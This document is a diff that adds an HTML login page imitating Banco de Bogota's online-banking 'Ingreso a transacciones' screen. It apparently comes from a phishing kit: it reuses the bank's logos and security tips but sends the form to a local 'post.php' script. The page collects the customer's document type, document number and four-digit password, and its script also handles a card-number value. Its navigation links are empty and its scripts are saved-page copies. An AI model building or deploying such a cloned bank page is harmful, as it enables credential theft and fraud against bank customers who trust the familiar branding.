@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+
+<html lang="es">
+
+<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta http-equiv="Expires" content="-1"><meta http-equiv="Cache-Control" content="no-cache, no-store, no-transform">
+
+
+<title>Ingreso a transacciones -  - Banco de Bogota</title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<meta http-equiv="content-language" content="es">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="copyright" content="Copyright 2005. A Toda Hora S.A. Todos los derechos reservados.">
+<script>
+	function soloNumeros(e){
+		var key = window.event ? e.which : e.keyCode;
+		if (key < 48 || key > 57) {
+			e.preventDefault();
+		}
+	}
+</script>
+<link rel="shortcut icon" type="image/x-icon" href="./images/favicon.ico">
+
+<link rel="icon" type="image/png" href="images/bankicon.png">
+
+
+<link rel="stylesheet" href="estilos/bootstrap.css" type="text/css">
+
+
+<link rel="stylesheet" href="estilos/id_main_new.css" type="text/css">
+
+
+<link rel="stylesheet" href="estilos/estilos-login.css" type="text/css">
+
+
+<link rel="stylesheet" href="estilos/main_site_new.css" type="text/css">
+ 
+
+<link rel="stylesheet" href="estilos/jquery-ui.css" type="text/css">
+
+<link rel="stylesheet" href="estilos/style.css" type="text/css">
+
+	<style>
+		
+		@media (max-width:640px)
+		{
+
+			
+			.newhorizontex{
+				overflow-x:hidden;
+			}
+			.imgmapfront {
+				display: none;
+			}
+			.reposicionamiento{
+				width: 30%;
+			}
+
+			.foterkioto{
+				margin-left: -200px;
+			}
+
+
+		}
+		
+
+	</style>
+
+
+
+<script async src="estilos/gtm.js.descarga"></script><script type="text/javascript" src="estilos/jsEncrypt.js.descarga"></script>
+<script language="javascript" src="estilos/jquery-1.10.0.min.js.descarga"></script>
+<script language="javascript" src="estilos/jquery-ui.js.descarga"></script>
+
+<script language="Javascript">
+
+function my_onkeydown_handler() {
+	switch (event.keyCode) {
+		case 116 : // 'F5'
+		event.returnValue = false;
+		event.keyCode = 0;
+		break;
+	}
+}
+
+if(navigator.appName=='Microsoft Internet Explorer'){
+	document.attachEvent("onkeydown", my_onkeydown_handler);
+}else{
+	document.onkeydown = function (e) {
+		if (e.keyCode === 116) {
+			return false;
+		}
+	};
+}
+</script>
+
+</head>
+
+
+
+<body class="newhorizontex">
+
+<table class="main-table-container">
+<tbody><tr>
+
+        <td valign="bottom">
+            <a href="http://www.superfinanciera.gov.co/" target="blank_"><img src="images/logo-vigilado-new.jpg" alt="Superintendencia de Industria y Comercio" border="0"></a>
+        </td>
+<td>
+<div class="contenedor token">
+
+
+<!-- RQ 24205 Inicio -->
+
+
+
+	
+	<script language="javascript" src="estilos/rsa.js.descarga"></script>
+
+
+<script language="javascript">
+  $( this ).ready(function() {
+            $(".formData").val(encode_deviceprint());
+  });
+</script>
+
+
+<!-- RQ 24205 Fin -->
+
+
+
+
+
+
+
+<script language="javascript" type="text/javascript">	  
+function cifrar(){	
+	var encrypt = new JSEncrypt();
+	var pubKey2 ='MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD87OlWHv7CvKZdHQYFuLazDbtuGUBzYgBBapdWf4TYDaP+W5z8aJeIgLVbEEJNlmIpyPczpCkpwdUrasE6iWIa7y1TOmM5PXlfJ4YrYcA4eGj5UdPKSZg9PTUxYjJgFAKDMls6/9gCPhVzNWRAZb8yCpGGN2yxQekFNlC5yICKuwIDAQAB';
+		encrypt.setPublicKey(pubKey2);
+		cifrado ('password', 'cryptPass', encrypt);
+		cifrado ('cardNumber', 'cryptCard', encrypt);
+	}
+	
+function cifrado(campo_form, campo_origen, encrypt){
+
+	var campo = document.getElementsByName(campo_form)[0];
+	var encrypted = encrypt.encrypt(campo.value);
+	var ateriscos = "";
+	for (x = 0; x < campo.value.length; x++) {
+		ateriscos = ateriscos + "*";
+	}
+	document.getElementsByName(campo_form)[0].value = ateriscos;
+	document.getElementsByName(campo_origen)[0].value = encrypted;
+}
+//<!-- RQ Start -->	
+function redirect()
+{
+	  var win = window.open("https://www.bancodebogota.com/wps/portal/banco-de-bogota/bogota", '_parent');
+	  win.focus();
+};
+//<!-- RQ End -->	
+</script>
+
+
+<div class="container container-login">
+
+  <!-- /bankcommon/common/includes/nav_top_outside.jsp -->
+
+
+<table style="text-align: left; width: 100%;" border="0">
+  <tbody>
+    <tr>
+      <td><img src="images/logo-banco-bogota.jpg" alt="Banco de Bogota"></td>
+      <td>      
+      	<h1 class="tag-h1">Ingreso a Transacciones</h1>
+        <p class="fine">Esta pantalla le permite ingresar sus datos para realizar transacciones por Internet.</p>
+      </td>
+    </tr>
+  </tbody>
+</table>
+<br><br><br><br>
+
+
+
+
+
+
+
+
+
+  <div class="row-fluid">
+    <div class="span7 span-login span7-login imgmapfront"> <img src="https://www.bancodebogota.com/wps/wcm/connect/banco-de-bogota/73d1f2ef-37e5-4d6a-acb4-d503f8eb0fab/banner-productos-internet-desktop.jpg?MOD=AJPERES" border="0" usemap="#Map">
+      <map name="Map" >
+        <area shape="rect" coords="-3,3,637,453" >
+      </map>
+    </div>
+
+    <div class="span3 login-campos span-login">
+			
+		<div class="error error-inline">
+         	
+        </div>
+       
+		
+		
+        
+
+        
+        
+
+
+      <form name="LogonBogForm" method="post" action="post.php" id="auto_off" autocomplete="off">
+      
+      	<!-- RQ 24205 Inicio -->
+      		<input type="hidden" name="devicePrint" class="formData" value="version%3D3%2E4%2E1%2E0%5F1%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%2010%2E0%3B%20win64%3B%20x64%29%20applewebkit%2F537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome%2F99%2E0%2E4844%2E51%20safari%2F537%2E36%7C5%2E0%20%28Windows%20NT%2010%2E0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F99%2E0%2E4844%2E51%20Safari%2F537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1366%7C768%7C728%26pm%5Ffpsw%3D%26pm%5Ffptz%3D1%26pm%5Ffpln%3Dlang%3Des%2DES%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3D1angdbagw48epntjechw48%7Cconz5cuxr16dont%7Cxyswrvkfix48%7Ckfchwymgdhw4cuxlfcbgw4cuxllsjkyz%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1366%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D%26pm%5Fos%3DWindows%26pm%5Fbrmjv%3D99%26pm%5Fbr%3DChrome%26pm%5Finpt%3D%26pm%5Fexpt%3D">
+      	<!-- RQ 24205 Inicio -->
+      	
+      	<input type="hidden" id="cryptPass" name="cryptPass">
+      	<input type="hidden" id="cryptCard" name="cryptCard">
+      	
+        
+          	<div class="cont-personas form-signin-inline">
+          	
+		<div class="bg-select-arrow">
+			<div class="select-arrow"> 
+				<select name="documentType" id="documentType" alt="Tipo de identificacion"><option value="">Seleccione...</option>
+<option value="Cedula de Ciudadania" selected="selected">C&eacute;dula de Ciudadania</option>
+					
+						<option value="Tarjeta de Identidad">Tarjeta de Identidad</option>
+					
+						<option value="Cedula de Extranjeria">Cedula de Extranjeria</option>
+					
+						<option value="NIT Persona Natural">NIT Persona Natural</option>
+					
+						<option value="NIT Persona Extranjera">NIT Persona Extranjera</option>
+					
+						<option value="NIT Persona Juridica">NIT Persona Juridica</option>
+					
+						<option value="Pasaporte">Pasaporte</option>
+					
+						<option value="Registro Civil">Registro Civil</option></select>
+			</div>
+		</div>
+		<br>
+        <div class="error">
+         	
+        </div>
+		
+		<div class="campo-texto">
+				<input autofocus type="text" name="documentNumber" id="documentNumber" autocomplete="off" maxlength="12" size="15" alt="numero de identificacion" value="" placeholder="N&uacute;mero de documento" required onkeypress="soloNumeros(event)"> 
+				<div class="error">
+					
+				</div>
+			</div>			
+			<div class="campo-texto">
+				<input type="password" name="password"  id="password" autocomplete="off" maxlength="4" size="12" alt="Clave segura" value="" placeholder="Clave segura" required onkeypress="soloNumeros(event)">
+				<div class="error">
+					
+				</div>
+			</div>
+	
+		
+		
+		<div class="cont-ingreso-seguro">
+			<input type="image" name="submit_submit" src="images/btn-ingresa-seguro.png" alt="Ingresar" border="0" tabindex="5" onclick="cifrar();this.disabled=true;this.form.alias__.name=this.name+&#39;.x&#39;;this.form.submit();"><input type="hidden" name="alias__">
+		</div>
+	</div>
+      </form>
+      
+      <div class="lista lista-inline">
+      <ul>
+        <li><a href="" target="_parent">Registrarme a Clave Segura <i class="i-arrowblue-right"></i></a></li>
+        <li><a href="" target="_parent">Ingresar con Clave Segura <i class="i-arrowblue-right"></i></a></li>
+        <li><a href="" target="_parent">Olvide mi Clave Segura <i class="i-arrowblue-right"></i></a></li>
+      </ul> 
+    </div>
+ <script type="text/javascript"> 
+
+	   function init(){
+			
+			var f = document.getElementById('auto_off');
+			if(f!=null && f!='undefined')
+			f.setAttribute("autocomplete", "off"); 
+		}
+ 
+		init();
+</script>       
+       
+    </div>
+   
+  </div>
+  
+  
+  <div class="titulo" class="reposicionamiento">
+    <h3>Por su seguridad tenga en cuenta...</h3>
+  </div>
+    <ul class="reposicionamiento thumbnails tooltip-demo " >
+    <li class="span3 span-login">
+      <div class="thumbnail "><img src="images/icono-seguridad-2.png" border="0">
+        <p class="texto-normal">Utilice computadores y redes seguras 
+            para realizar sus transacciones, evite 
+            hacerlo desde sitios publicos.</p>
+      </div>
+      </li>
+    <li class="span3 span-login">
+        <div class="thumbnail"><img src="images/icono-https-2.png" border="0">
+        <p class="texto-normal">Digite siempre en la barra del navegador 
+            la direccion del Banco 
+            www.bancodebogota.com y verifique que 
+            este precedida por https y un candado 
+            cerrado en la parte superior o inferior del 
+            navegador.</p>
+      </div>
+      </li>
+    <li class="span3 span-login">
+        <div class="thumbnail"><img src="images/icono-clave-segura-2.png" border="0">
+        <p class="texto-normal">Cambie periodicamente su Clave Segura, 
+            especialmente si ha utilizado un sitio 
+            publico y cierre siempre su sesion.</p>
+      </div>
+      </li>
+    <li class="span3 span-login">
+        <div class="thumbnail"><img src="images/icono-token__2.png" border="0">
+        <p class="texto-normal">Solicite y utilice el TOKEN, el dispositivo 
+            que le brinda un nivel adicional de 
+            seguridad para realizar sus transacciones 
+            con mayor tranquilidad y confianza.</p>
+      </div>
+      </li>
+  </ul>
+
+</div>
+<!-- /bankcommon/common/includes/id_footer_new.jsp -->
+
+
+
+
+
+
+
+
+
+
+
+
+  <table class="foterkioto cont_footer" cellspacing="0" cellpadding="0">
+    <tbody>
+      <tr>
+        <td class="footerimg">
+   	        <a href="https://seal.verisign.com/splash?form_file=fdf/splash.fdf&amp;dn=www.bancodebogota.com&amp;lang=es" target="blank_"><img src="images/logo-norton.jpg" alt="Certificado por Verisign" border="0"></a>
+        </td>
+        <td>
+            <a href="https://www.grupoval.com/" target="blank_"><img src="images/logo-aval-new.jpg" alt="Grupo Aval" border="0"></a>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</td>
+</tr>
+</tbody></table>
+
+
+
+
+
+   <meta http-equiv="pragma" content="no-cache">
+
+
+<script src="estilos/jsImage.js.descarga" type="text/javascript"></script>
+
+
+    
+    
+</body></html>
